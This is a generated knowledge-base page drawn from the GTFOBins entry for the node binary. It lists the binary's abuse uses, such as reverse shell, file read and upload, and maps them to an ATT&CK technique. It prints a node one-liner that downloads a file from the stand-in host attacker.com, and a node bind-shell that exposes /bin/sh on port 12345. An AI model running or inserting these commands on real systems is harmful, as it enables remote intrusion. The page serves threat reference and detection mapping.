---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# node

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `node` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for node covering bind-shell, download, file-read, file-write, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/node.md)
- Source verification: [source record](../../sources/gtfobins/node.md)

## Aliases

- `node`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))' |

## Source Verification

[source record](../../sources/gtfobins/node.md)

## Evidence Excerpt

```text
_body: ''
_name: node
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node
functions:
bind-shell:
- code: "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n\
\  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"
connector: tcp-client
```
